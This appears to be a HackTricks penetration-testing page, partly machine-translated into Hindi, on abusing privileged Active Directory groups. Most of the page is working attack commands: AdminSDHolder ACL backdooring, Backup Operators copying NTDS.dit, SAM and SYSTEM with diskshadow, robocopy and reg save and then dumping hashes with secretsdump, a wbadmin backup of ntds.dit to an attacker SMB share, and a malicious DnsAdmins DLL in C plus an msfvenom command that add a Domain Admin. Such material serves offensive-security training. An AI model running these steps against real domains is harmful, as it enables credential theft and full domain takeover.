# Privileged Groups

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="/.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

Use [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=command-injection) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
Get Access Today:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=command-injection" %}

## Well Known groups with administration privileges

* **Administrators**
* **Domain Admins**
* **Enterprise Admins**

## Account Operators

यह समूह उन खातों और समूहों को बनाने के लिए सक्षम है जो डोमेन पर प्रशासक नहीं हैं। इसके अतिरिक्त, यह डोमेन कंट्रोलर (DC) पर स्थानीय लॉगिन को सक्षम करता है।

इस समूह के सदस्यों की पहचान करने के लिए, निम्नलिखित कमांड निष्पादित की जाती है:
```powershell
Get-NetGroupMember -Identity "Account Operators" -Recurse
```
नए उपयोगकर्ताओं को जोड़ना अनुमति है, साथ ही DC01 पर स्थानीय लॉगिन भी।

## AdminSDHolder समूह

**AdminSDHolder** समूह की एक्सेस कंट्रोल लिस्ट (ACL) महत्वपूर्ण है क्योंकि यह सक्रिय निर्देशिका के भीतर सभी "संरक्षित समूहों" के लिए अनुमतियाँ सेट करती है, जिसमें उच्च-privilege समूह शामिल हैं। यह तंत्र इन समूहों की सुरक्षा सुनिश्चित करता है, जिससे अनधिकृत संशोधनों को रोका जा सके।

एक हमलावर इसको **AdminSDHolder** समूह की ACL को संशोधित करके भुनाने की कोशिश कर सकता है, जिससे एक मानक उपयोगकर्ता को पूर्ण अनुमतियाँ मिल जाएँगी। इससे उस उपयोगकर्ता को सभी संरक्षित समूहों पर पूर्ण नियंत्रण मिल जाएगा। यदि इस उपयोगकर्ता की अनुमतियाँ बदली या हटा दी जाती हैं, तो उन्हें सिस्टम के डिज़ाइन के कारण एक घंटे के भीतर स्वचालित रूप से पुनर्स्थापित कर दिया जाएगा।

सदस्यों की समीक्षा करने और अनुमतियों को संशोधित करने के लिए आदेश शामिल हैं:
```powershell
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```
एक स्क्रिप्ट उपलब्ध है जो पुनर्स्थापन प्रक्रिया को तेज करती है: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).

अधिक जानकारी के लिए, [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence) पर जाएं।

## AD रीसाइक्ल बिन

इस समूह में सदस्यता हटाए गए Active Directory ऑब्जेक्ट्स को पढ़ने की अनुमति देती है, जो संवेदनशील जानकारी प्रकट कर सकती है:
```bash
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```
### Domain Controller Access

DC पर फ़ाइलों तक पहुँच प्रतिबंधित है जब तक कि उपयोगकर्ता `Server Operators` समूह का हिस्सा न हो, जो पहुँच के स्तर को बदलता है।

### Privilege Escalation

Sysinternals से `PsService` या `sc` का उपयोग करके, कोई सेवा अनुमतियों की जांच और संशोधन कर सकता है। उदाहरण के लिए, `Server Operators` समूह के पास कुछ सेवाओं पर पूर्ण नियंत्रण होता है, जो मनमाने आदेशों के निष्पादन और विशेषाधिकार वृद्धि की अनुमति देता है:
```cmd
C:\> .\PsService.exe security AppReadiness
```
यह कमांड दिखाता है कि `Server Operators` के पास पूर्ण पहुंच है, जो उच्चाधिकार के लिए सेवाओं में हेरफेर करने की अनुमति देता है।

## बैकअप ऑपरेटर

`Backup Operators` समूह में सदस्यता `DC01` फ़ाइल प्रणाली तक पहुंच प्रदान करती है क्योंकि इसमें `SeBackup` और `SeRestore` विशेषताएँ हैं। ये विशेषताएँ फ़ोल्डर ट्रैवर्सल, लिस्टिंग, और फ़ाइल कॉपी करने की क्षमताएँ सक्षम करती हैं, यहां तक कि स्पष्ट अनुमतियों के बिना, `FILE_FLAG_BACKUP_SEMANTICS` ध्वज का उपयोग करके। इस प्रक्रिया के लिए विशिष्ट स्क्रिप्ट का उपयोग करना आवश्यक है।

समूह के सदस्यों की सूची बनाने के लिए, निष्पादित करें:
```powershell
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```
### Local Attack

इन विशेषाधिकारों का स्थानीय रूप से लाभ उठाने के लिए, निम्नलिखित चरणों का उपयोग किया जाता है:

1. आवश्यक पुस्तकालय आयात करें:
```bash
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```
2. `SeBackupPrivilege` को सक्षम करें और सत्यापित करें:
```bash
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```
3. प्रतिबंधित निर्देशिकाओं से फ़ाइलों तक पहुँचें और उन्हें कॉपी करें, उदाहरण के लिए:
```bash
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
```
### AD Attack

डोमेन कंट्रोलर की फ़ाइल प्रणाली तक सीधी पहुँच `NTDS.dit` डेटाबेस की चोरी की अनुमति देती है, जिसमें डोमेन उपयोगकर्ताओं और कंप्यूटरों के सभी NTLM हैश होते हैं।

#### Using diskshadow.exe

1. `C` ड्राइव की एक शैडो कॉपी बनाएं:
```cmd
diskshadow.exe
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
begin backup
add volume C: alias cdrive
create
expose %cdrive% F:
end backup
exit
```
2. `NTDS.dit` को शैडो कॉपी से कॉपी करें:
```cmd
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```
वैकल्पिक रूप से, फ़ाइल कॉपी करने के लिए `robocopy` का उपयोग करें:
```cmd
robocopy /B F:\Windows\NTDS .\ntds ntds.dit
```
3. हैश पुनर्प्राप्ति के लिए `SYSTEM` और `SAM` निकालें:
```cmd
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```
4. `NTDS.dit` से सभी हैश प्राप्त करें:
```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```
#### Using wbadmin.exe

1. हमलावर मशीन पर SMB सर्वर के लिए NTFS फ़ाइल सिस्टम सेट करें और लक्षित मशीन पर SMB क्रेडेंशियल कैश करें।
2. सिस्टम बैकअप और `NTDS.dit` निष्कर्षण के लिए `wbadmin.exe` का उपयोग करें:
```cmd
net use X: \\<AttackIP>\sharename /user:smbuser password
echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
wbadmin get versions
echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
```

व्यावहारिक प्रदर्शन के लिए, देखें [DEMO VIDEO WITH IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s).

## DnsAdmins

**DnsAdmins** समूह के सदस्य अपने विशेषाधिकारों का उपयोग करके DNS सर्वर पर SYSTEM विशेषाधिकारों के साथ एक मनमाना DLL लोड कर सकते हैं, जो अक्सर डोमेन कंट्रोलर्स पर होस्ट किया जाता है। यह क्षमता महत्वपूर्ण शोषण की संभावना की अनुमति देती है।

DnsAdmins समूह के सदस्यों की सूची बनाने के लिए, उपयोग करें:
```powershell
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```
### मनमाने DLL को निष्पादित करें

सदस्य DNS सर्वर को मनमाना DLL (या तो स्थानीय रूप से या किसी दूरस्थ शेयर से) लोड करने के लिए निम्नलिखित कमांड का उपयोग कर सकते हैं:
```powershell
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
An attacker could modify the DLL to add a user to the Domain Admins group or execute other commands with SYSTEM privileges. Example DLL modification and msfvenom usage:
```

```c
// Modify DLL to add user
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```

```bash
// Generate DLL with msfvenom
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```
DNS सेवा को पुनः प्रारंभ करना (जिसके लिए अतिरिक्त अनुमतियों की आवश्यकता हो सकती है) DLL को लोड करने के लिए आवश्यक है:
```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```
For more details on this attack vector, refer to ired.team.

#### Mimilib.dll
यह भी संभव है कि कमांड निष्पादन के लिए mimilib.dll का उपयोग किया जाए, इसे विशिष्ट कमांड या रिवर्स शेल निष्पादित करने के लिए संशोधित किया जाए। [इस पोस्ट को देखें](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html) अधिक जानकारी के लिए।

### WPAD Record for MitM
DnsAdmins DNS रिकॉर्ड को मैन-इन-द-मिडल (MitM) हमलों को करने के लिए हेरफेर कर सकते हैं, वैश्विक क्वेरी ब्लॉक सूची को अक्षम करने के बाद WPAD रिकॉर्ड बनाकर। Responder या Inveigh जैसे उपकरणों का उपयोग स्पूफिंग और नेटवर्क ट्रैफ़िक कैप्चर करने के लिए किया जा सकता है।

### Event Log Readers
सदस्य इवेंट लॉग्स तक पहुँच सकते हैं, संभावित रूप से संवेदनशील जानकारी जैसे कि प्लेनटेक्स्ट पासवर्ड या कमांड निष्पादन विवरण खोज सकते हैं:
```powershell
# Get members and search logs for sensitive information
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
```
## Exchange Windows Permissions
यह समूह डोमेन ऑब्जेक्ट पर DACLs को संशोधित कर सकता है, संभावित रूप से DCSync विशेषाधिकार प्रदान कर सकता है। इस समूह का लाभ उठाकर विशेषाधिकार वृद्धि के लिए तकनीकों का विवरण Exchange-AD-Privesc GitHub repo में दिया गया है।
```powershell
# List members
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```
## Hyper-V Administrators
Hyper-V Administrators को Hyper-V पर पूर्ण पहुंच प्राप्त होती है, जिसका उपयोग वर्चुअलाइज्ड डोमेन कंट्रोलर्स पर नियंत्रण प्राप्त करने के लिए किया जा सकता है। इसमें लाइव DCs को क्लोन करना और NTDS.dit फ़ाइल से NTLM हैश निकालना शामिल है।

### Exploitation Example
Firefox का Mozilla Maintenance Service Hyper-V Administrators द्वारा SYSTEM के रूप में कमांड निष्पादित करने के लिए शोषित किया जा सकता है। इसमें एक सुरक्षित SYSTEM फ़ाइल के लिए एक हार्ड लिंक बनाना और इसे एक दुर्भावनापूर्ण निष्पादन योग्य फ़ाइल से बदलना शामिल है:
```bash
# Take ownership and start the service
takeown /F C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
sc.exe start MozillaMaintenance
```
Note: हार्ड लिंक शोषण हाल के Windows अपडेट में कम किया गया है।

## संगठन प्रबंधन

उन वातावरणों में जहां **Microsoft Exchange** तैनात है, एक विशेष समूह जिसे **संगठन प्रबंधन** कहा जाता है, महत्वपूर्ण क्षमताएँ रखता है। यह समूह **सभी डोमेन उपयोगकर्ताओं के मेलबॉक्सों तक पहुँचने** के लिए विशेषाधिकार प्राप्त है और **'Microsoft Exchange सुरक्षा समूहों'** संगठनात्मक इकाई (OU) पर **पूर्ण नियंत्रण** बनाए रखता है। इस नियंत्रण में **`Exchange Windows Permissions`** समूह शामिल है, जिसका उपयोग विशेषाधिकार वृद्धि के लिए किया जा सकता है।

### विशेषाधिकार शोषण और कमांड

#### प्रिंट ऑपरेटर
**प्रिंट ऑपरेटर** समूह के सदस्यों को कई विशेषाधिकार प्राप्त होते हैं, जिसमें **`SeLoadDriverPrivilege`** शामिल है, जो उन्हें **डोमेन कंट्रोलर पर स्थानीय रूप से लॉग इन करने**, उसे बंद करने और प्रिंटर प्रबंधित करने की अनुमति देता है। इन विशेषाधिकारों का शोषण करने के लिए, विशेष रूप से यदि **`SeLoadDriverPrivilege`** एक निम्न स्तर के संदर्भ में दिखाई नहीं देता है, तो उपयोगकर्ता खाता नियंत्रण (UAC) को बायपास करना आवश्यक है।

इस समूह के सदस्यों की सूची बनाने के लिए, निम्नलिखित PowerShell कमांड का उपयोग किया जाता है:
```powershell
Get-NetGroupMember -Identity "Print Operators" -Recurse
```
For more detailed exploitation techniques related to **`SeLoadDriverPrivilege`**, one should consult specific security resources.

#### Remote Desktop Users
इस समूह के सदस्यों को रिमोट डेस्कटॉप प्रोटोकॉल (RDP) के माध्यम से PCs तक पहुंच प्राप्त होती है। इन सदस्यों की गणना करने के लिए, PowerShell कमांड उपलब्ध हैं:
```powershell
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```
अधिक जानकारी RDP का शोषण करने के लिए समर्पित pentesting संसाधनों में पाई जा सकती है।

#### रिमोट प्रबंधन उपयोगकर्ता
सदस्य **Windows Remote Management (WinRM)** के माध्यम से PCs तक पहुँच सकते हैं। इन सदस्यों की गणना निम्नलिखित के माध्यम से की जाती है:
```powershell
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```
For exploitation techniques related to **WinRM**, specific documentation should be consulted.

#### Server Operators
यह समूह डोमेन कंट्रोलर्स पर विभिन्न कॉन्फ़िगरेशन करने के लिए अनुमतियाँ रखता है, जिसमें बैकअप और पुनर्स्थापना की अनुमतियाँ, सिस्टम समय बदलना, और सिस्टम को बंद करना शामिल है। सदस्यों की गणना करने के लिए, प्रदान किया गया कमांड है:
```powershell
Get-NetGroupMember -Identity "Server Operators" -Recurse
```
## References <a href="#references" id="references"></a>

* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
* [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
* [https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory)
* [https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--](https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--)
* [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
* [http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/](http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/)
* [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
* [https://rastamouse.me/2019/01/gpo-abuse-part-1/](https://rastamouse.me/2019/01/gpo-abuse-part-1/)
* [https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13](https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13)
* [https://github.com/tandasat/ExploitCapcom](https://github.com/tandasat/ExploitCapcom)
* [https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp)
* [https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
* [https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
* [https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html](https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)

<figure><img src="/.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

Use [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=command-injection) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
Get Access Today:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=command-injection" %}

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
